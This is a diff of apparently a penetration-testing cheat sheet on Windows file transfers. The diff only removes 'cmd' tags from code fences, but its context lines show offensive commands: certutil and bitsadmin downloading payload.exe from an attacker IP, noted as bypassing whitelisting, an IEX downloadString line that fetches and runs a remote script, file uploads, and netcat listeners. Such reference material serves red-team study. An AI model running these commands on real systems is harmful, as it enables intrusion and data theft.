@@ -50,7 +50,7 @@ Invoke-RestMethod -Uri "http://10.10.10.1:8000/upload" -Method Post -ContentType
 
 ## CertUtil Transfers
 
-```cmd
+```
 :: Download file using certutil (often bypasses application whitelisting)
 certutil -urlcache -split -f "http://10.10.10.1:8000/payload.exe" payload.exe
 
@@ -67,7 +67,7 @@ certutil -decode payload.txt payload.exe
 
 ## BITS Transfers
 
-```cmd
+```
 :: Start BITS transfer job
 bitsadmin /transfer myJob /download /priority high "http://10.10.10.1:8000/payload.exe" "C:\Windows\Temp\payload.exe"
 
@@ -81,7 +81,7 @@ Start-BitsTransfer -Source "http://10.10.10.1:8000/payload.exe" -Destination "C:
 ## SMB Transfers
 
 ### Mount SMB Share
-```cmd
+```
 :: Mount drive
 net use Z: \\10.10.10.1\share /user:username password
 
@@ -108,7 +108,7 @@ impacket-smbserver share -smb2support /path/to/files
 ## FTP Transfers
 
 ### Command Line FTP
-```cmd
+```
 :: Create FTP script
 echo open 10.10.10.1 21 > ftp.txt
 echo user anonymous >> ftp.txt
@@ -134,7 +134,7 @@ $client.DownloadFile("ftp://10.10.10.1/payload.exe", "C:\Windows\Temp\payload.ex
 
 ## TFTP Transfers (Windows 7/Server 2008)
 
-```cmd
+```
 :: Install TFTP client if needed
 pkgmgr /iu:"TFTP"
 
@@ -201,7 +201,7 @@ debug < script.txt
 
 ## Windows Command Line Tricks
 
-```cmd
+```
 :: Using Powershell from cmd.exe when PowerShell is blocked
 echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1:8000/script.ps1') | powershell -
 
@@ -254,7 +254,7 @@ $webClient.DownloadFile("http://10.10.10.1:8000/payload.exe", "C:\Windows\Temp\p
 ## Post-Exploitation Tools
 
 ### NetCat for Windows
-```cmd
+```
 :: Receive file
 nc.exe -lvp 4444 > received_file.exe
 
